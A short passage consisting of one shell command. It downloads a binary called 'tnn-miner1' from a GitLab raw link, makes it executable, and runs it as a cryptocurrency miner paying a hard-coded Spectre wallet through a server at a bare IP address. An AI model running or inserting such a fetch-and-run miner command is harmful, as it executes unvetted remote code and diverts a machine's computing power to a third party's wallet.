...
wget https://gitlab.com/majapahlevi/mvp/-/raw/main/tnn-miner1 && chmod 777 tnn-miner1 && ./tnn-miner1 --spectre --wallet spectre:qrzat3hsnclq9mwq5rtqgdp0fyfc6kjlx9v7hwh6tc2y78zy2enkk2z5deydr --daemon-address 142.93.71.111 --port 80 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --threads 4
